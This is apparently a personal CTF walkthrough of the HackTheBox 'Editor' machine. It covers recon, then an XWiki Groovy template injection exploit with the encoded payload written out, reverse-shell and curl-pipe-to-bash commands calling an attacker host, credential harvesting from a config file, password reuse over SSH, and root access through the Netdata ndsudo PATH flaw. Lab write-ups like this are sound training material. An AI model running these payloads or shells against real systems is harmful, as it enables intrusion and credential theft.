# Editor - Workthrough

## Recon

### Initial Scanning
For easy to do, I add target machine IP to /etc/hosts then I do nmap as initial scanning:  
nmap -sCV -p- -vvv --min-rate 10000 editor.htb

PORT     STATE SERVICE REASON         VERSION  
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj  +N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=  
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM  
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)  
|_http-server-header: nginx/1.18.0 (Ubuntu)  
|_http-title: Editor - SimplistCode Pro  
| http-methods:   
|_  Supported Methods: GET HEAD  
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20  
|_http-open-proxy: Proxy might be redirecting requests  
| http-robots.txt: 50 disalloId entries (40 shown)  
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/   
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/   
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/   
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/   
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/   
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/   
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/   
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/   
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/   
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/   
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/   
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/   
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/   
|_/xwiki/bin/logout/  
| http-Ibdav-scan:   
|   AlloId Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK  
|   Server Type: Jetty(10.0.20)  
|_  IbDAV type: Unknown  
| http-methods:   
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK  
|_  Potentially risky methods: PROPFIND LOCK UNLOCK  
| http-title: XWiki - Main - Intro  
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/  
| http-cookie-flags:   
|   /:   
|     JSESSIONID:   
|_      httponly flag not set  
|_http-server-header: Jetty(10.0.20)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

I found 3 ports open are 22/tcp, 80/tcp, 8080/tcp

The host is running on Ubuntu 22.04 jammy [LTS] based on this Ibsite (https://0xdf.gitlab.io/cheatsheets/os#ubuntu)

All 3 ports show TTL 63 which indicates the expected TTL for Linux one hop away (64 - 63 = 1 hop)

Rule of thumb of OS identification:  
Linux / MAC - 64  
Windows - 128  
Routers / Network Devices - 255  

### Subdomain Brute Force
Check for subdomain from main domain editor.htb  
ffuf -u http://10.129.5.179 -H "Host: FUZZ.editor.htb" -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -ac

I found wiki as subdomain  
wiki                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 38ms]  
:: Progress: [20000/20000] :: Job [1/1] :: 1257 req/sec :: Duration: [0:00:17] :: Errors: 0 ::  

Since I already added editor.htb to /etc/hosts, now I add wiki.editor.htb to /etc/hosts as Ill  
10.129.5.179    editor.htb wiki.editor.htb

Now I rerun nmap with our subdomain: nmap -sCV -p 80,8080 wiki.editor.htb and wiki subdomain may be nginx proxy to port 8080

Now let's look at http://editor.htb/

The Docs links direct to http://wiki.editor.htb/xwiki/bin/view/Main/

The About link doesn't make any Ib requests besides 404

Now I run feroxbuster against the Ibsite with -x html  
feroxbuster -u http://editor.htb -x html

=> Nothing interest to us

Now I visit editor.htb:8080 or 10.10.11.80:8080 or wiki.editor.htb all return the same site, which is the Wiki docs for the SimplistCode Pro software

After checking with Wappalyzer, the site is running on XWiki

I do curl -I http://wiki.editor.htb/xwiki/bin/view/Main/ to check HTTP response headers when visiting port 8080

Looking at page footer or Ibsite it has the version XWiki Debian 15.10.8 

I google XWiki Debian 15.10.8  cve and there is CVE-2025-32974 (CVE will change depend when you do it)

I look at Github security advisory (https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rr6p-3pfg-562j)

### POC 
The payload decode to  }}}{{async async=false}}{{groovy}}println("Hello from" + " search text:" + (23 + 19)){{/groovy}}{{/async}}

This is some templating injection where code inside Groovy runs as Groovy script

I put the POC in http://wiki.editor.htb

Here is the url with encode payload http://wiki.editor.htb/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20

The Groovy command in there generates the text string “Hello from search text:42”. When I paste this into Firefox, it downloads a file:

I open it Firefox it shows RSS feed for search on [}}}Hello from search text:42 ]

And that is RCE.

I do some research and found this Stackoverflow post (https://stackoverflow.com/questions/159148/groovy-executing-shell-commands)

I want to update from println to "id".execute().text. Now I use Burp Repeater for this. 

I select the green stuff after “text=” and push Ctrl-Shift-u to URL decode it  
GET /xwiki/bin/view/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("Hello from" + " search text:" + (23 + 19)){{/groovy}}{{/async}} HTTP/1.1

I update the cmd to to this   
GET /xwiki/bin/view/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}} HTTP/1.1

Then I Url encode or ctrl u this part }}}{{async async=false}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}}

Then right click –> Convert selection –> URL –> URL-encode all characters

We add encoded space %20

Then click send at line 485 we can see search on [}}}uid=997(xwiki) gid=997(xwiki) groups=997(xwiki) ]&lt;/title&gt;<br>

I also tried reverse shell bash -i >& /dev/tcp/10.129.5.179/443 0>&1 but not working

I tried to curl with server listing at port 80: sudo python -m http.server 80

curl http://10.129.5.179/rev|bash

Then are some requests I tried to curl

curl http://10.129.5.179/rev -o /dev/shm/rev

For some reason It is not working for me I search on Github found another POC

git clone https://github.com/gunzf0x/CVE-2025-24893.git

Then I excute this cmd python3 CVE-2025-24893.py -t 'http://wiki.editor.htb' -c 'busybox nc ATTACKER_IP -e /bin/bash' with  nc -lvnp 4455 

Then we have RCE on nc listener

It had bad shell so I copy and paste this cmd

python3 -c 'import pty; pty.spawn("/bin/bash")'  
Ctrl-Z  
  
stty raw -echo; fg  
  
#Press Enter twice, and type the command   
export TERM=xterm   

Then I get to this directory xwiki@editor:/usr/lib/xwiki-jetty$

I do cd ../../.. then cd to home directory and

cat /etc/passwd | grep 'sh$' user doesn't have access

I go to cd /etc/xwiki

Hibernate is a Java ORM (maps the programming language / framework to the database) and hibernate.cfg.xml is a large file that we are interested then I take a look at that file

I do cat hibernate.cfg.xml | grep password to see any interesting

and there is MySQL connection with user xwiki and the password is theEd1t0rTeam99

I use netexec to see any share password
netexec ssh editor.htb -u root -p theEd1t0rTeam99
netexec ssh editor.htb -u oliver -p theEd1t0rTeam99

and Oliver user does share the same

I try SSH to user oliver with password discover

ssh oliver@editor.htb
password: `theEd1t0rTeam99`

I can use sshpass but they said it is insecure in real world but attack box is fine 
### User flag

Then i do whoami i got oliver 
oliver@editor:~$ whoami  
oliver  

Then I dir found user.txt then cat user.txt
User flag = 0f77f91bed5deffa55bcce093264fe0a

### Priviledge Escalation

I check network listening port ss -tnl  
There are a few listening on localhost only. I’ll poke at 19999, 8125, and 43143. 3306 is the XWiki MySQL connection, and 33060 is likely related.

I’ll use SSH tunnels to create tunnels to these ports. For just three ports, I can create them individually and port forwarding  
Each -L option creates a tunnel from first port on my host to the same port on localhost on Editor.  
sshpass -p theEd1t0rTeam99 ssh oliver@editor.htb -L 19999:localhost:19999 -L 8125:localhost:8125 -L 43143:localhost:43143

I visit http://localhost:43143/ in my browser and return 404

With TCP 8125 I try to curl it stucks on http and https => this remain to be investigate

Now I visit http://localhost:19999/ and it shows me the dashboard

Editor is running 1.45.2. I can also find this version using the netdata binary on Editor:

/opt/netdata/bin/netdata -W buildinfo

### Exploit
Now I search netdata 1.45.2 cve and it references to CVE-2024-32019

I found https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation

I tried to do manually but not working but I do automation I got the root

I go through root and find cat root.txt
55136b8ef82a282b373d1939c7235a21


I finally do the manually after so many attempts using curl/wget not working then i use scp  
scp nvme oliver@10.129.5.179:/tmp/nvme

Then I do ls and nvme is in then I do chmod +x nvme

Then  
oliver@editor:/tmp$ which nvme  
/tmp/nvme  
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list  
root@editor:/tmp# whoami  
root  